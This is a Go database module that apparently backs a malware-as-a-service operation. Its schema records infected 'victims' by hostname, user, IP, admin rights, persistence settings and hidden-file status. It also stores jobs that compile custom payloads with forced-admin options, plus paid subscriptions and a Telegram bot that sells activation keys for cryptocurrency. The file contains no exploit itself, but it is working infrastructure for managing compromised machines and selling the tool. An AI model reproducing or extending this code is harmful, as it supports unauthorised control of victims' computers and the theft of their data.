package storage

import (
	"database/sql"
	"errors"
	"os"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"
)

type DB struct {
	sql *sql.DB
}

func OpenFromEnv() (*DB, error) {
	dsn := os.Getenv("DATABASE_URL")
	if dsn == "" {
		return nil, errors.New("DATABASE_URL is not set")
	}
	conn, err := sql.Open("pgx", dsn)
	if err != nil {
		return nil, err
	}
	conn.SetMaxOpenConns(50)
	conn.SetMaxIdleConns(25)
	conn.SetConnMaxLifetime(30 * time.Minute)
	if err := conn.Ping(); err != nil {
		_ = conn.Close()
		return nil, err
	}
	return &DB{sql: conn}, nil
}

func (d *DB) Close() error {
	if d == nil || d.sql == nil {
		return nil
	}
	return d.sql.Close()
}

func (d *DB) InitSchema() error {
	if d == nil || d.sql == nil {
		return errors.New("db is nil")
	}
	_, err := d.sql.Exec(`
		CREATE TABLE IF NOT EXISTS victims (
			id TEXT PRIMARY KEY,
			country TEXT,
			device_type TEXT,
			hostname TEXT,
			"user" TEXT,
			"window" TEXT,
			ip TEXT,
			comment TEXT,
			build_id TEXT,
			os TEXT,
			cpu TEXT,
			gpu TEXT,
			ram TEXT,
			last_active BIGINT,
			online BOOLEAN NOT NULL DEFAULT FALSE,
			owner TEXT,
			admin BOOLEAN NOT NULL DEFAULT FALSE,
			build_version TEXT NOT NULL DEFAULT '',
			startup_delay_sec INTEGER NOT NULL DEFAULT 0,
			autorun_mode TEXT NOT NULL DEFAULT '',
			install_path TEXT NOT NULL DEFAULT '',
			hide_files_enabled BOOLEAN NOT NULL DEFAULT FALSE
		);
		CREATE TABLE IF NOT EXISTS banned_victims (
			id TEXT PRIMARY KEY,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
		);
		CREATE TABLE IF NOT EXISTS hidden_victims (
			owner TEXT NOT NULL,
			victim_id TEXT NOT NULL,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			PRIMARY KEY (owner, victim_id)
		);
		CREATE TABLE IF NOT EXISTS users (
			login TEXT PRIMARY KEY,
			password TEXT NOT NULL,
			builder_token TEXT,
			subscription_status TEXT,
			subscription_activated_at TIMESTAMPTZ,
			email TEXT,
			email_verified BOOLEAN NOT NULL DEFAULT FALSE,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
		);
		CREATE TABLE IF NOT EXISTS user_sessions (
			id TEXT PRIMARY KEY,
			login TEXT NOT NULL,
			expires_at TIMESTAMPTZ NOT NULL,
			ip TEXT,
			ua TEXT,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
		);
		CREATE TABLE IF NOT EXISTS compile_jobs (
			id TEXT PRIMARY KEY,
			login TEXT NOT NULL,
			status TEXT NOT NULL,
			code TEXT NOT NULL,
			name TEXT,
			password TEXT,
			icon BYTEA,
			force_admin TEXT,
			error TEXT,
			filename TEXT,
			artifact BYTEA,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			started_at TIMESTAMPTZ,
			finished_at TIMESTAMPTZ
		);
		CREATE TABLE IF NOT EXISTS email_verifications (
			login TEXT PRIMARY KEY,
			email TEXT NOT NULL,
			code TEXT NOT NULL,
			expires_at TIMESTAMPTZ NOT NULL
		);
		CREATE TABLE IF NOT EXISTS subscription_keys (
			key TEXT PRIMARY KEY,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			activated_by TEXT,
			activated_at TIMESTAMPTZ
		);
		CREATE TABLE IF NOT EXISTS bot_users (
			telegram_id BIGINT PRIMARY KEY,
			username TEXT,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			balance NUMERIC(18,8) NOT NULL DEFAULT 0,
			total_paid NUMERIC(18,8) NOT NULL DEFAULT 0
		);
		CREATE TABLE IF NOT EXISTS bot_orders (
			id SERIAL PRIMARY KEY,
			telegram_id BIGINT NOT NULL,
			invoice_id TEXT UNIQUE,
			amount_crypto NUMERIC(18,8) NOT NULL,
			currency TEXT NOT NULL,
			status TEXT NOT NULL,
			provider TEXT NOT NULL,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			paid_at TIMESTAMPTZ
		);
		CREATE TABLE IF NOT EXISTS payment_ledger (
			invoice_id TEXT PRIMARY KEY,
			telegram_id BIGINT NOT NULL,
			amount NUMERIC(18,8) NOT NULL,
			currency TEXT NOT NULL,
			source TEXT NOT NULL,
			status TEXT NOT NULL,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			applied_at TIMESTAMPTZ
		);
		CREATE TABLE IF NOT EXISTS bot_purchases (
			id SERIAL PRIMARY KEY,
			telegram_id BIGINT NOT NULL,
			product TEXT NOT NULL,
			price NUMERIC(18,8) NOT NULL,
			activation_key TEXT,
			created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
		);
		CREATE INDEX IF NOT EXISTS idx_victims_last_active ON victims(last_active);
		CREATE INDEX IF NOT EXISTS idx_victims_online ON victims(online);
		CREATE INDEX IF NOT EXISTS idx_victims_country ON victims(country);
		CREATE INDEX IF NOT EXISTS idx_victims_build_id ON victims(build_id);
		CREATE INDEX IF NOT EXISTS idx_banned_victims_created_at ON banned_victims(created_at);
		CREATE INDEX IF NOT EXISTS idx_hidden_victims_owner ON hidden_victims(owner);
		CREATE INDEX IF NOT EXISTS idx_hidden_victims_victim_id ON hidden_victims(victim_id);
		CREATE INDEX IF NOT EXISTS idx_bot_orders_telegram_id ON bot_orders(telegram_id);
		CREATE INDEX IF NOT EXISTS idx_bot_purchases_telegram_id ON bot_purchases(telegram_id);
		CREATE INDEX IF NOT EXISTS idx_payment_ledger_telegram_id ON payment_ledger(telegram_id);
		CREATE INDEX IF NOT EXISTS idx_user_sessions_login ON user_sessions(login);
		CREATE INDEX IF NOT EXISTS idx_user_sessions_expires_at ON user_sessions(expires_at);
		CREATE INDEX IF NOT EXISTS idx_compile_jobs_login_created ON compile_jobs(login, created_at);
		CREATE INDEX IF NOT EXISTS idx_compile_jobs_status_created ON compile_jobs(status, created_at);
	`)
	return err
}
